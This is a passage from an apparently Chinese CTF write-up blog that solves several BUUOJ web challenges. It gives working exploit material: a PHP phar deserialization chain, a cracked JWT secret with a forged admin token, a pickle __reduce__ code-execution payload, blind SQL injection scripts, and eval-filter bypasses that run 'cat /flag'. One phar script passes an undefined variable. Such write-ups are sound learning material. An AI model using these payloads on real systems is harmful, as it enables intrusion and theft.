class="variable">$i</span> &lt; 4; <span class="variable">$i</span>++) <span class="variable">$size</span> /= 1024;</span><br><span class="line">        <span class="built_in">return</span> round(<span class="variable">$size</span>, 2).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">detele</span></span>() &#123;</span><br><span class="line">        unlink(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">close</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>download.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br><span class="line"><span class="variable">$file</span> = new File();</span><br><span class="line"><span class="variable">$filename</span> = (string) <span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; 40 &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">"flag"</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>delete<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">include <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br><span class="line"><span class="variable">$file</span> = new File();</span><br><span class="line"><span class="variable">$filename</span> = (string) <span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; 40 &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    <span class="variable">$response</span> = array(<span class="string">"success"</span> =&gt; <span class="literal">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="built_in">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    <span class="variable">$response</span> = array(<span class="string">"success"</span> =&gt; <span class="literal">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="built_in">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>用download.php中的$file-&gt;close();<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">close</span></span>() &#123;</span><br><span class="line">        <span class="built_in">return</span> file_get_contents(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>构造链子<br>先看filelist::destruct只有一个echo可以触发tostring，可是没有tostring23333，然后看call的<code>$file-&gt;$func();</code><br>可以调用任意函数，再看到上面file类的close方法，可以读文件，下面想的是如何触发call，看了一圈没找到触发call的地方2333<br>看了wp发现自己少看了一个user类，user::destruct<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>直接调用了close，还触发个鬼的call，我真是个憨憨<br>后来发现这样不行，直接file_get_contents，没有输出函数的话，是没得回显的<br>这里要感谢p3师傅，帮我解决了很多小问题<br>所以db必须是filelist类，触发call之后，再调用file的close，再回到filelist的destruct，最后有个echo输出读取内容<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    public <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private <span class="variable">$files</span>;</span><br><span class="line">    private <span class="variable">$results</span>;</span><br><span class="line">    private <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">        <span class="variable">$file</span> = new File();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;files = array(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$this</span>-&gt;results = array();</span><br><span class="line">        <span class="variable">$this</span>-&gt;funcs = array();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = new User();</span><br><span class="line"><span class="variable">$o</span>-&gt;db = new FileList();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">'test.phar'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">'test.txt'</span>, <span class="string">'text'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER(); ? &gt;'</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p>
<p>然后就是触发的地方，有download.php和delete.php，都是通过if里面的file类的open函数里的file_exists和is_dir触发，is_dir再处理<br>phar://时返回值为true，所以都是返回File not exist，也都触发了反序列化，但是downLoad.php有这么一句<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"><span class="built_in">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br></pre></td></tr></table></figure></p>
<p>basedir限制了访问目录，chdir绕过basedir正常访问上传的文件，但是在触发反序列化读取flag文件时，flag在根目录，读取失败<br>所以只能在delete页面触发反序列化<br><img src="https://uploader.shimo.im/f/ctyPCxjB3t8owOlM.png!thumbnail" alt></p>
<h2 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a>ikun</h2><p>复现一波，附上<a href="https://blog.csdn.net/qq_26406447/article/details/91964502" target="_blank" rel="noopener">参考wp</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,1000):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    url=<span class="string">"http://516c2c78-bb2b-4dff-848b-2aebadfc0832.node3.buuoj.cn/shop?page=&#123;&#125;"</span></span><br><span class="line">    url=url.format(i)</span><br><span class="line">    p=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"lv6.png"</span> <span class="keyword">in</span> p.text):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"成功"</span>)</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>跑出来是181页然后到购买页面点结算，把折扣改为一个很小的数<br><img src="https://uploader.shimo.im/f/1Q6wmDhkfjAd3QH5.png!thumbnail" alt><br>302转到/b1g_m4mber，然后提示只有admin能访问<br>cookie里有个jwt值（JSON Web Token）然后到 <a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 解析<br>上面那个有点卡 <a href="http://jwt.calebb.net/" target="_blank" rel="noopener">http://jwt.calebb.net/</a>  这个也行<br><img src="https://uploader.shimo.im/f/3iXeOY9SyVsVYfbK.png!thumbnail" alt><br>可以看到解析结果里面有用户名，把用户名改为admin，再用跑出来的密钥加密一下就能得到admin的jwt了<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a><br><img src="https://uploader.shimo.im/f/dWgKbmIiBjQk6Vev.png!thumbnail" alt><br>密钥是1Kun<br>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<br>修改之后f12发现<br><img src="https://uploader.shimo.im/f/gdS3uLtYqhw3LNr7.png!thumbnail" alt><br>下载源码审计admin.py<br>因为没有接触过python反序列化，这里直接记录下师傅的pyload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">"admin"</span>:</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=0)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'no_ass.html'</span>)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(<span class="string">'become'</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'form.html'</span>, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            <span class="built_in">return</span> self.render(<span class="string">'form.html'</span>, res=<span class="string">'This is Black Technology!'</span>, member=0)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">相比于 PHP 反序列化必须要依赖于当前代码中类的存在以及方法的存在，Python 凭借着自己彻底的面向对象的特性完胜 PHP ，Python 除了能反</span><br><span class="line">序列化当前代码中出现的类(包括通过 import的方式引入的模块中的类)的对象以外，还能利用其彻底的面向对象的特性来反序列化使用 types 创</span><br><span class="line">建的匿名对象，这样的话就大大拓宽了我们的攻击面</span><br><span class="line">当序列化以及反序列化的过程中中碰到一无所知的扩展类型( python2,这里指的就是新式类)的时候，可以通过类中定义的 __reduce__ 方法来告</span><br><span class="line">知如何进行序列化或者反序列化也就是说我们，只要在新式类中定义一个__reduce__ 方法，我们就能在序列化的使用让这个类根据我们在 </span><br><span class="line">__reduce__ 中指定的方式进行序列化</span><br></pre></td></tr></table></figure>
<p>可以用nc在vps上开个端口监听，让其去访问<br>也可以利用返回参数把它带出来<br>可以看到上面的代码p是可以返回的，这里我们让p等于flag的内容，就能获得flag了<br>payload：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       <span class="built_in">return</span> (<span class="built_in">eval</span>, (<span class="string">"open('/flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line"><span class="built_in">print</span> a</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/F7l8p7JO4g8AkFde.png!thumbnail" alt></p>
<h2 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h2><p>过滤了注释符，试了一下异或注入，可以过滤了limit和group，注不出来表名的（触非只有一个表）<br>其实这道题直接就给了表名和列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">All You Want Is In Table <span class="string">'flag'</span> and the column is <span class="string">'flag'</span></span><br><span class="line">Now, just give the id of passage</span><br></pre></td></tr></table></figure></p>
<p>flag表和flag列，布尔盲注<br>脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">list = <span class="string">"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm_0123456789.,&#123;&#125;-"</span></span><br><span class="line">i=1</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">url=<span class="string">"http://16a38db3-8993-4ff1-a050-81b660d9dbb3.node3.buuoj.cn/index.php"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2,20):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> list:</span><br><span class="line">        id=<span class="string">"1^if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)^1"</span>.format(i,ord(j))</span><br><span class="line">        data=&#123;<span class="string">"id"</span>:id&#125;</span><br><span class="line">        p=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"Hello, glzjin wants a girlfriend."</span> <span class="keyword">in</span> p.text):</span><br><span class="line">                    flag=flag+j</span><br><span class="line">                    <span class="built_in">print</span>(flag)</span><br><span class="line">                    <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p>其实不用异或，直接盲注也可<br>也可不用括号，tab符代替空格</p>
<h2 id="Love-Math"><a href="#Love-Math" class="headerlink" title="Love Math"></a>Love Math</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'c'</span>]))&#123; </span><br><span class="line">    show_source(__FILE__); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    //例子 c=20-1 </span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= 80) &#123; </span><br><span class="line">        die(<span class="string">"太长了不会算"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\'</span><span class="string">', '</span><span class="string">"', '`', '\[', '\]']; </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$blacklist</span> as <span class="variable">$blackitem</span>) &#123; </span></span><br><span class="line"><span class="string">        if (preg_match('/' . <span class="variable">$blackitem</span> . '/m', <span class="variable">$content</span>)) &#123; </span></span><br><span class="line"><span class="string">            die("</span>请不要输入奇奇怪怪的字符<span class="string">"); </span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line"><span class="string">    <span class="variable">$whitelist</span> = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];</span></span><br><span class="line"><span class="string">    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);   </span></span><br><span class="line"><span class="string">    foreach (<span class="variable">$used_funcs</span>[0] as <span class="variable">$func</span>) &#123; </span></span><br><span class="line"><span class="string">        if (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123; </span></span><br><span class="line"><span class="string">            die("</span>请不要输入奇奇怪怪的函数<span class="string">"); </span></span><br><span class="line"><span class="string">        &#125; </span></span><br><span class="line"><span class="string">    &#125; </span></span><br><span class="line"><span class="string">    //帮你算出答案 </span></span><br><span class="line"><span class="string">    eval('echo '.<span class="variable">$content</span>.';'); </span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>没啥思路啊，附<a href="https://www.cnblogs.com/sijidou/p/10802475.html" target="_blank" rel="noopener">wp</a><br>记录一下payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=hypot.min.fmod;<span class="variable">$pi</span>=<span class="variable">$pi</span>&#123;2&#125;.<span class="variable">$pi</span>&#123;0&#125;.<span class="variable">$pi</span>&#123;2&#125;.<span class="variable">$pi</span>&#123;6&#125;.<span class="variable">$pi</span>&#123;7&#125;.<span class="variable">$pi</span>&#123;8&#125;.<span class="variable">$pi</span>&#123;3&#125;;<span class="variable">$pi</span>()</span><br><span class="line">//phpinfo()</span><br></pre></td></tr></table></figure></p>
<p>base_convert()函数转换进制的一个函数，可以转到2-36进制之间，36进制包含所有的小写字母<br>可以用十进制转36进制来生成payload<br>下划线不在36进制中，file_get_contents不能用，大写也用不了，$_GET，$_POST不能用<br>getallheader()来控制请求头，通过请求头的字段读取flag.php<br>getallheader()返回的是数组，要从数组里面取数据用array[‘xxx’]，但是[]被waf了，可以用{}<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(696468,10,36)((<span class="variable">$pi</span>(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line">//<span class="built_in">exec</span>(<span class="function"><span class="title">getallheaders</span></span>()&#123;1&#125;)</span><br><span class="line"><span class="built_in">echo</span> xx,yy 这样xx和yy都会输出，所以base_convert后是逗号</span><br><span class="line">在请求头加上 1:cat /flag即可</span><br></pre></td></tr></table></figure></p>
<p>还有一种方法<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exp=cat /flag&amp;abs=system&amp;c=<span class="variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="variable">$pi</span>)&#123;abs&#125;($<span class="variable">$pi</span>&#123;exp&#125;)</span><br><span class="line">base_convert(37907361743,10,36)</span><br><span class="line">//得到hex2bin()，把16进制数转为ascii字符</span><br><span class="line">dechex()把十进制转为16进制</span><br><span class="line">整体得到_GET</span><br></pre></td></tr></table></figure></p>
<p>其实主要思路都是利用base_convert把十进制转为字符串，调用函数，另外base_convert接收的十进制数不能太大，否则会溢出</p>
<h2 id="Easyweb"><a href="#Easyweb" class="headerlink" title="Easyweb"></a>Easyweb</h2><p>/robots.txt发现备份文件<br>image.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=isset(<span class="variable">$_GET</span>[<span class="string">"id"</span>])?<span class="variable">$_GET</span>[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line"><span class="variable">$path</span>=isset(<span class="variable">$_GET</span>[<span class="string">"path"</span>])?<span class="variable">$_GET</span>[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(array(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(array(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">"select * from images where id='&#123;<span class="variable">$id</span>&#125;' or path='&#123;<span class="variable">$path</span>&#125;'"</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">"./"</span> . <span class="variable">$row</span>[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure></p>
<p>addslashes函数对预定义字符加反斜杠<br>预定义字符是：单引号（’）双引号（”）反斜杠（\）NULL<br>过滤了单引号，所以只能用参数污染的方式逃逸出来第二个参数的单引号，再注释掉后一个单引号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images <span class="built_in">where</span> id=<span class="string">'\'</span> or path=<span class="string">'#'</span></span><br></pre></td></tr></table></figure></p>
<p>如果直接id=\,会被转义变成\,巧妙的地方在str_replace的过滤顺序上<br>\0比\先给替换为空，id=\0，被转义后变成\0,\0先被过滤，\逃逸出来<br>脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">i=1</span><br><span class="line">n=2</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(22,30):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    m=64</span><br><span class="line">    j=64</span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(1,9):</span><br><span class="line">        <span class="keyword">if</span> q!=1 and q!=8:</span><br><span class="line">            j=j/2</span><br><span class="line">            <span class="keyword">if</span> n==1:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==0:</span><br><span class="line">                m=m-j</span><br><span class="line">        <span class="comment">#time.sleep(0.15)</span></span><br><span class="line">        url1=<span class="string">"http://abdb5c41-1004-4076-9dbe-c8ca367960e0.node3.buuoj.cn/image.php?id=\\0&amp;path="</span></span><br><span class="line">        <span class="keyword">if</span> q!=8:</span><br><span class="line">            <span class="comment">#url1="http://eb6f3e10-4e15-48be-a6e9-a64ac0ed813b.node3.buuoj.cn/image.php?id=\\0&amp;path="</span></span><br><span class="line">            <span class="comment">#payload="or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;&#125;,1))=&#123;&#125;%23".format(i,ord(j))</span></span><br><span class="line">            payload=<span 